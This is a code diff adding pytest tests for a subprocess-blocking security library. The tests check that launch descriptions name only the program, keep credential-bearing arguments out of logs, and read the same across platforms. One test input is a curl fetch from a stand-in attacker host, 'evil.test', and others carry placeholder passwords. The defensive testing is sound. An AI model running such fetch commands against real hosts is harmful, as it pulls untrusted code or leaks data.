@@ -335,6 +335,66 @@ class TestSubprocessPolicyDirect:
         assert "subprocess.Popen" in desc
         assert "/usr/bin/python" in desc
 
+    @pytest.mark.parametrize(
+        ("cmdline", "program"),
+        [
+            ("curl -s https://evil.test/x", "curl"),
+            ("curl", "curl"),
+            ("  curl\t-s", "curl"),
+            ('"C:\\Program Files\\Git\\bin\\git.exe" clone https://u:secret@host/r', None),
+            ('"C:\\Program Files\\Git\\bin\\git.exe"', None),
+            ('"C:\\Program Files\\Git\\bin\\git.exe', None),  # unterminated quote
+            ('"two\nlines.exe" arg', "two lines.exe"),  # never a multi-line log record
+            ("", "<unknown>"),
+            ("   ", "<unknown>"),
+            ('"" arg', "<unknown>"),
+        ],
+    )
+    def test_describe_subprocess_launch_popen_windows_command_line(self, cmdline, program):
+        """Windows: the executable is None and the command line names the program."""
+        if program is None:
+            program = "C:\\Program Files\\Git\\bin\\git.exe"
+        desc = _describe_subprocess_launch("subprocess.Popen", (None, cmdline, None, None))
+        assert desc == f"subprocess.Popen({program})"
+
+    def test_describe_subprocess_launch_popen_leaves_arguments_out(self):
+        """Arguments can hold credentials; like the POSIX layout, only the program is named."""
+        cmdline = "mysql --user=root --password=hunter2 -e \"select 'x'\""
+        desc = _describe_subprocess_launch("subprocess.Popen", (None, cmdline, None, None))
+        assert desc == "subprocess.Popen(mysql)"
+
+    def test_describe_subprocess_launch_popen_windows_explicit_executable(self):
+        """With ``executable=`` the launched image is known; it is what gets reported."""
+        args = ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c "echo hi"', None, None)
+        desc = _describe_subprocess_launch("subprocess.Popen", args)
+        assert desc == "subprocess.Popen(C:\\Windows\\System32\\cmd.exe)"
+
+    def test_describe_subprocess_launch_popen_long_program_is_cut(self):
+        desc = _describe_subprocess_launch("subprocess.Popen", (None, "x" * 5000 + " arg"))
+        assert desc == "subprocess.Popen(" + "x" * 260 + "...)"
+
+    @pytest.mark.parametrize("args", [(), (None,), (None, None), (None, ["curl", "-s"])])
+    def test_describe_subprocess_launch_popen_without_a_program(self, args):
+        """Nothing usable in the event: say so instead of printing ``None``."""
+        assert _describe_subprocess_launch("subprocess.Popen", args) == (
+            "subprocess.Popen(<unknown>)"
+        )
+
+    def test_blocked_launch_names_the_program_on_every_platform(self, caplog):
+        """The same launch reads the same in the log and in the exception, POSIX or Windows."""
+        tethered.activate(allow=[], external_subprocess_policy="block")
+        with (
+            caplog.at_level(logging.WARNING, logger="tethered"),
+            pytest.raises(tethered.SubprocessBlocked) as excinfo,
+        ):
+            subprocess.run(["tethered-test-no-such-tool", "--token", "hunter2"])  # nosec B603 B607
+        assert excinfo.value.description == "subprocess.Popen(tethered-test-no-such-tool)"
+        messages = [r.message for r in caplog.records]
+        assert (
+            "tethered: blocked external subprocess launch: "
+            "subprocess.Popen(tethered-test-no-such-tool)"
+        ) in messages
+
     def test_describe_subprocess_launch_os_system(self):
         """_describe_subprocess_launch formats os.system events correctly."""
         desc = _describe_subprocess_launch("os.system", ("echo hello",))
